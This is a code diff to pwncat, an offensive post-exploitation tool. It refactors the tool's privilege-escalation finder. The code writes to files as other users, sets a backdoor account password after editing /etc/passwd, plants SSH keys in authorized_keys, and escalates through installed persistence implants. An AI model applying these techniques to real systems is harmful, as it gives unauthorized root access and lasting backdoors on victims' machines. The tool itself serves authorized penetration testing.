@@ -127,9 +127,9 @@ class Finder:
 
         current_user = pwncat.victim.current_user
         if (
-            target_user == current_user["name"]
-            or current_user["uid"] == 0
-            or current_user["name"] == "root"
+            target_user == current_user.name
+            or current_user.id == 0
+            or current_user.name == "root"
         ):
             with pwncat.victim.open(filename, "wb", length=len(data)) as filp:
                 filp.write(data)
@@ -201,9 +201,9 @@ class Finder:
 
         current_user = pwncat.victim.current_user
         if (
-            target_user == current_user["name"]
-            or current_user["uid"] == 0
-            or current_user["name"] == "root"
+            target_user == current_user.name
+            or current_user.id == 0
+            or current_user.name == "root"
         ):
             pipe = pwncat.victim.open(filename, "rb")
             return pipe, chain
@@ -351,7 +351,7 @@ class Finder:
                         "/etc/passwd", added_lines=lines[-1:]
                     )
 
-                    pwncat.victim.users[user]["password"] = pwncat.victim.config[
+                    pwncat.victim.users[user].password = pwncat.victim.config[
                         "backdoor_pass"
                     ]
                     self.backdoor_user = pwncat.victim.users[user]
@@ -430,7 +430,7 @@ class Finder:
             # AuthorizedKeysFile is normally relative to the home directory
             if not authkeys_path.startswith("/"):
                 # Grab the user information from /etc/passwd
-                home = pwncat.victim.users[techniques[0].user]["home"]
+                home = pwncat.victim.users[techniques[0].user].homedir
 
                 if home == "" or home is None:
                     raise PrivescError("no user home directory, can't add ssh keys")
@@ -460,12 +460,12 @@ class Finder:
                 # authenticate without a password and without clobbering their
                 # keys.
                 ssh_key_glob = os.path.join(
-                    pwncat.victim.users[reader.user]["home"], ".ssh", "*.pub"
+                    pwncat.victim.users[reader.user].homedir, ".ssh", "*.pub"
                 )
                 # keys = pwncat.victim.run(f"ls {ssh_key_glob}").strip().decode("utf-8")
                 keys = ["id_rsa.pub"]
                 keys = [
-                    os.path.join(pwncat.victim.users[reader.user]["home"], ".ssh", key)
+                    os.path.join(pwncat.victim.users[reader.user].homedir, ".ssh", key)
                     for key in keys
                 ]
 
@@ -553,9 +553,10 @@ class Finder:
                 authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
             )
 
-            if len(authkeys) > 1:
+            if len(readers) > 0:
+                # We read the content in, so we know what we added
                 pwncat.victim.tamper.modified_file(
-                    authkeys_path, added_lines=pubkey + "\n"
+                    authkeys_path, added_lines=[pubkey + "\n"]
                 )
             else:
                 # We couldn't read their authkeys, but log that we clobbered it. The user asked us to.  :shrug:
@@ -622,11 +623,11 @@ class Finder:
 
         current_user = pwncat.victim.current_user
         if (
-            target_user == current_user["name"]
-            or current_user["uid"] == 0
-            or current_user["name"] == "root"
+            target_user == current_user.name
+            or current_user.id == 0
+            or current_user.name == "root"
         ):
-            raise PrivescError(f"you are already {current_user['name']}")
+            raise PrivescError(f"you are already {current_user.name}")
 
         if starting_user is None:
             starting_user = current_user
@@ -639,9 +640,9 @@ class Finder:
 
         # Check if we have a persistence method for this user
         util.progress(f"checking local persistence implants")
-        for persist in pwncat.victim.persist.find(
-            installed=True, local=True, user=target_user
-        ):
+        for user, persist in pwncat.victim.persist.installed:
+            if not persist.local or (user != target_user and user is not None):
+                continue
             util.progress(
                 f"checking local persistence implants: {persist.format(target_user)}"
             )
@@ -699,35 +700,29 @@ class Finder:
 
         # Try to use persistence as other users
         util.progress(f"checking local persistence implants")
-        for user in pwncat.victim.users:
+        for user, persist in pwncat.victim.persist.installed:
             if self.in_chain(user, chain):
                 continue
-            util.progress(f"checking local persistence implants: {user}")
-            for persist in pwncat.victim.persist.find(
-                installed=True, local=True, system=False, user=user
-            ):
-                util.progress(
-                    f"checking local persistence implants: {persist.format(user)}"
-                )
-                if persist.escalate(user):
-                    if pwncat.victim.whoami() != user:
-                        if pwncat.victim.getenv("SHLVL") != shlvl:
-                            pwncat.victim.run("exit", wait=False)
-                        continue
-
-                    chain.append(
-                        (f"persistence - {persist.format(target_user)}", "exit")
-                    )
-
-                    try:
-                        return self.escalate(target_user, depth, chain, starting_user)
-                    except PrivescError:
-                        chain.pop()
+            util.progress(
+                f"checking local persistence implants: {persist.format(user)}"
+            )
+            if persist.escalate(user):
+                if pwncat.victim.whoami() != user:
+                    if pwncat.victim.getenv("SHLVL") != shlvl:
                         pwncat.victim.run("exit", wait=False)
+                    continue
 
-                    # Don't retry later
-                    if user in techniques:
-                        del techniques[user]
+                chain.append((f"persistence - {persist.format(target_user)}", "exit"))
+
+                try:
+                    return self.escalate(target_user, depth, chain, starting_user)
+                except PrivescError:
+                    chain.pop()
+                    pwncat.victim.run("exit", wait=False)
+
+                # Don't retry later
+                if user in techniques:
+                    del techniques[user]
 
         # We can't escalate directly to the target. Instead, try recursively
         # against other users.
